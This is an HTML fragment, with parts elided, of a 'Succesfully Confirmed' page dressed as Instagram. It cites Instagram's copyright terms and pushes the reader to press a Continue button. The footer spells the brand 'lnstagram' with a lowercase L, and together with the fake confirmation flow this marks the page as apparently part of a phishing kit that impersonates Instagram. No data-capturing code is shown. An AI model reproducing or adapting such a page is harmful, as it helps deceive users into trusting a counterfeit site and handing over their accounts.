...
<div id="menu">
	...
	<img src="confirm.gif" width="240">
	<h3 style="font-family:sans-serif; font-weight:400;line-height:10px;font-size:25px;">Succesfully Confirmed</h3>

	<p style="font-family:sans-serif; font-size:15px; color: #999; line-height:18px; font-weight:350; margin-top:15px;">The key copyright license you provide to Instagram when you post content on it is found under Your Commitments in Instagram's Terms of Use under the subheading Permissions You Give Us: We do not claim ownership of your content, but you grant us a license to use it. Nothing is changing about your rights in your content.For get more info Click Continue Button</p>
<br>
...
<button type="submit" style="color:white; width:100%; outline:0; border:0; border-radius:3px;   
    ...
    font-weight:bold; 
    height:33px;
    width:200px;" value="submit">Continue</button>
</a>
<br><br>
<li style="font-family:sans-serif; margin-top:6px; color: #999">
     	
          lnstagram 2022 Copyright ©
      </li>
